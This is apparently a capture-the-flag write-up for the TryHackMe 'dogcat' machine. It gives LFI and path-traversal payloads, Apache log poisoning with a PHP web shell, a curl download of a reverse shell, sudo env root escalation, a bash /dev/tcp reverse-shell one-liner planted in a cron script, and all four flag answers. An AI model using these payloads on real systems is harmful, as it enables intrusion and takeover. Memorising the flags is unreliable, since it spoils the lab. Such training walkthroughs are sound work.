# dogcat - Medium

```shell
nmap -T4 -p- -A -v 10.10.14.121

feroxbuster -u http://10.10.14.121 -w /usr/share/wordlists/dirb/common.txt -x php,html,bak,js,txt,json,docx,pdf,zip --extract-links --scan-limit 2 --filter-status 401,403,404,405,500 --silent

vim reverse-shell.php

python3 -m http.server
#transfer shell to victim machine using curl

nc -nvlp 4444

#we get reverse shell on visiting shell.php

pwd

find / -type f -name flag* 2>/dev/null

cat /var/www/flag2_QMW7JvaY2LvK.txt

sudo -l
#we can run env binary as root

sudo /usr/bin/env /bin/sh
#root shell

find / -type f -name flag* 2>/dev/null

cat /root/flag3.txt

ls -la /opt

ls -la /opt/backups

cat /opt/backups/backup.sh
#we can overwrite this to get reverse-shell

echo "#!/bin/bash\nbash -i >& /dev/tcp/10.14.31.212/5555 0>&1" > /opt/backups/backup.sh

#on attacker machine
nc -nvlp 5555
#we get reverse shell here
```

* Open ports & services:

  * 22 - ssh - OpenSSH 7.6p1 (Ubuntu)
  * 80 - http - Apache httpd 2.4.38 (Debian)

* We can start by enumerating the webpage for hidden directories.

* The webpage allows us to view photos of dogs and cats, using the 'view' parameter.

* Using ```feroxbuster```, we know that the webpage has directories /cats and /dogs. Besides this, it has a /flag.php page as well, but it cannot be accessed directly.

* When we attempt to view it using ```?view=flag.php```, we get an error message; so we will have to check for other ways to get LFI.

* Using ```?view=cat/../flag.php```, we get error messages - it shows that the code automatically adds '.php' to the end of the path - so it looks for the file 'flag.php.php'

* Futhermore, we cannot use LFI directly here, due to filters; so we can attempt to use other techniques to evade filters by experimenting in Burp Suite Repeater.

* Referring the ```HackTricks``` page for LFI payloads, we get a PHP payload using which we can view the PHP code:

  ```php://filter/convert.base64-encode/resource=index.php```

* Therefore, we can view the PHP source code using:

  ```?view=php://filter/convert.base64-encode/resource=dog```

* This gives us base64-encoded PHP code, and when decoded shows the PHP code for showing dog images.

* As the webpage checks for the strings "dog" or "cat" in the beginning, the request required to view source code for /index.php is:

  ```?view=php://filter/convert.base64-encode/resource=dog/../index```

* Checking the decoded code shows that there is another parameter ```ext``` which adds the default extension '.php', unless specified.

* Now, we can get flag 1 by viewing 'flag.php' similar to how we were able to view 'index.php' above.

* We can view '/etc/passwd' using the following request:

  ```?view=dog/../../../../etc/passwd&ext=```

* Now, we need to attempt to convert LFI to RCE - we can do so using log poisoning method.

* Using the following request, we can view the Apache log files:

  ```?view=dog/../../../../var/log/apache2/access.log&ext=```

* Now, using Burp Suite, we can capture the above request.

* Modify the request's User-Agent field to the value:

  ```<?php system($_REQUEST['c']);?>```

* Now, if we use the following request, we can view the processes running:

  ```?view=dog/../../../../var/log/apache2/access.log&ext=&c=ps```

* Using 'whoami' command similarly, we can see that we are the user 'www-data'.

* Now, we are unable to get reverse-shell using commands (as it's usually done); so we can attempt to transfer reverse-shell file on victim machine using ```curl```.

* Setup the Python http server on attacker machine, and execute the command ```curl http://10.14.31.212:8000/reverse-shell.php -o shell.php``` using RCE in victim machine.

* Now, setup listener and navigate to '/shell.php' - this gives us reverse shell on our listener.

* Now, searching for files with the name 'flag' in it gives flag 2.

* Using ```sudo -l```, we can see that the 'env' binary can be run as root without password.

* We can get exploit for the 'env' binary from GTFObins, and run exploit to get root shell.

* We can get flag 3 from the root directory.

* Now, checking the /opt directory, we have a backups folder inside - this contains a script and a .tar archive.

* The script seems to create an archive of /root/container, a folder which we cannot access directly.

* The .tar file is created recently as well, so we can assume this script to run as a cron job.

* We can overwrite the backup.sh script with a reverse-shell one-liner and setup listener on attacker machine.

* We get reverse-shell on our listener, and we can get flag4 from the /root directory.

```markdown
1. What is flag 1? - THM{Th1s_1s_N0t_4_Catdog_ab67edfa}

2. What is flag 2? - THM{LF1_t0_RC3_aec3fb}

3. What is flag 3? - THM{D1ff3r3nt_3nv1ronments_874112}

4. What is flag 4? - THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}
```
